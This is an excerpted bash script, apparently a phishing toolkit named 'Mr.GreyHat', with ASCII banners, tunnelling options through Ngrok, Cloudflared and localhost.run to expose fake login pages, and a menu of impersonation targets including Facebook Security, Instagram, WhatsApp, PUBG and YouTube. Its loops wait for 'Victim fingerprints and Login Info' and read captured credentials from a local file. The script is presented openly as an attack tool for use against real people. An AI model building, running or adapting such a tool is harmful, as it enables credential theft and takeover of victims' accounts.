...
chmod -R 777 GreyHatPack.sh
chmod -R 777 Server.sh
...
${BLUE} 888b     d888           .d8888b.                                888    888          888     
${BLUE} 8888b   d8888          d88P  Y88b                               888    888          888     
${BLUE} 88888b.d88888          888    888                               888    888          888   
${BLUE} 888Y88888P888 888d888  888        888d888 .d88b.  888  888      8888888888  8888b.  888888  
${BLUE} 888 Y888P 888 888P"    888  88888 888P"  d8P  Y8b 888  888      888    888     "88b 888     
${BLUE} 888  Y8P  888 888      888    888 888    88888888 888  888      888    888 .d888888 888     
${BLUE} 888   "   888 888  d8b Y88b  d88P 888    Y8b.     Y88b 888      888    888 888  888 Y88b.   
${BLUE} 888       888 888  Y8P  "Y8888P88 888     "Y8888   "Y88888      888    888 "Y888888  "Y888  
${BLUE}                                                       888                                   
${BLUE}                                                   Y8b d88P                                  
${BLUE}                                                    "Y88P"                                   
${ORANGE}   __                                    
${ORANGE}  (_   _. ._   _. _|_ |\ |  _.     _. |  
${ORANGE}  __) (_| | | (_|  |_ | \| (_| \/ (_| |< 
${ORANGE}                               /         
			
		${CYAN}Mr.GreyHat Tool Made For Fucked You. 	${ORANGE} Version:2022.4 
		${CYAN}Mr.GreyHat Created by ${ORANGE}SanatNayak ${CYAN}(https://www.youtube.com/c/MrGreyHacker) ${WHITE}
	
	EOF

	printf "${RESETBG}"	
}
#Mr.GreyHat_Hacker_Sanat
   ...
   echo -ne "\n${GREEN}[${WHITE}-${GREEN}]${MAGENTA} Waiting for Victim fingerprints and Login Info.. ${BLUE}Ctrl + C ${MAGENTA}to exit..."
	...
	while true; do
		...
		if [[ -e ".www/fingerprints.txt" ]]; then
			echo -e "\n\n${GREEN}[${WHITE}-${GREEN}]${MAGENTA} Footprints Victim Found!"
			get_fingerprints
...
credentials_manual() {
   ...
   while true; do	
       ...
       if [[ -e ".www/fingerprints.txt" ]]; then
			echo -e "\n\n${GREEN}[${WHITE}-${GREEN}]${MAGENTA} Victim FootPrint Found!"
			get_fingerprints
			rm -rf .www/fingerprints.txt
		fi
...
{ clear; header; echo; }
	...
	case $REPLY in 
	    ...
	    1) 
	        echo "Please Entert Your Ngrok Authtoken :"
	        read authtoken
...
tunnel() {
	...
	${CYAN}   --------------------------- 
		...
		${GREEN}[${WHITE}1${GREEN}]${CYAN} Localhost ${MAGENTA} 
		${GREEN}[${WHITE}2${GREEN}]${CYAN} LocalhostRun ${MAGENTA} 
		${GREEN}[${WHITE}3${GREEN}]${CYAN} Cloudflared ${MAGENTA}
		${GREEN}[${WHITE}4${GREEN}]${CYAN} Ngrok ${MAGENTA} 
...
attack() {
 ...
 { clear; header; echo; }
	...
	cat <<- EOF
		...
		${GREEN}[${WHITE}15${GREEN}]${CYAN} Facebook Security    ${GREEN}[${WHITE}39${GREEN}]${CYAN} Pubg           ${GREEN}[${WHITE}62${GREEN}]${CYAN} Whatsapp                    
		...
		${GREEN}[${WHITE}22${GREEN}]${CYAN} Insta Followers      ${GREEN}[${WHITE}46${GREEN}]${CYAN} Skyrock        ${GREEN}[${WHITE}69${GREEN}]${CYAN} Youtube SUb
...
SanatNayak(){
	...
	echo -e $'  \e[1;96m\e[0m\e[1;77m\e[0m\e[1;96m\e[0m\e[1;91m  !!           Wellcome To GreyHat         !!\e[0m'
	echo -e $'  \e[1;91m\e[0m\e[1;91m\e[0m\e[1;96m\e[0m\e[1;91m   ---------------------------------------- \e[1;91m\e[0m'
	echo ""
	echo -e ""
	echo ""
	echo ""
	read -p $' \e[1;40m\e[31m[\e[32m*\e[31m]\e[32m Enter Secret Key : \e[0m' sanat
	echo ""
...
menu() {
 ...
 { clear; header; echo; }
	...
	cat <<- EOF
		...
		${GREEN}[${WHITE}2${GREEN}]${CYAN} Apis
		${GREEN}[${WHITE}3${GREEN}]${CYAN} Email
		${GREEN}[${WHITE}4${GREEN}]${CYAN} Sound (PC Only)
	...
	case $REPLY in 
		...
		0)
		echo -ne "\n${GREEN}[${WHITE}!${GREEN}]${ORANGE} Thanks for using Mr.GreyHat Family "${WHITE}
		sleep 2
		clear
		exit 1;;
